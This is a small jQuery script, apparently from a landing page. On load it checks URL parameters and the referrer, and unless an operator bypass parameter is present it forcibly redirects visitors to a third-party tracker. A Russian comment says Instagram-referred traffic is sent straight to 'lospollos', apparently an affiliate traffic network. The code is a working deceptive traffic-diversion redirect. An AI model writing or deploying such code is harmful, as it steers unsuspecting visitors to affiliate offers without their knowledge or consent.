$( document ).ready(function() {
	var param;
	var prev = document.referrer;



    function getUrlVars()
	{
	    var vars = [], hash;
	    var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
	    for(var i = 0; i < hashes.length; i++)
	    {
	        hash = hashes[i].split('=');
	        vars.push(hash[0]);
	        vars[hash[0]] = hash[1];
	    }
	    if(vars.param == "StayHome") {
	    	alert('b');
	    	return;
	    }
	    if(vars.param == "GoLP") {
			window.location.href = "http://tracker.xkuklohd.beget.tech/track/from-instangram/source/campaign-ads"
	    }

	    if (prev.indexOf('instagram.com') + 1) { //уводим на лосполлос сразу
			window.location.href = "http://tracker.xkuklohd.beget.tech/track/from-instangram/source/campaign-ads"
		}

	    else (
	    	window.location.href = "http://tracker.xkuklohd.beget.tech/track/los-pollos-bez-uvoda/source/campaign-ads"
	    )  
	}
	getUrlVars();
});

//var prev = document.referrer;

/*if (prev.indexOf('instagram') + 1) {
	window.location.href = "http://tracker.xkuklohd.beget.tech/track/los-pollos-bez-uvoda/source/campaign-ads"
}*/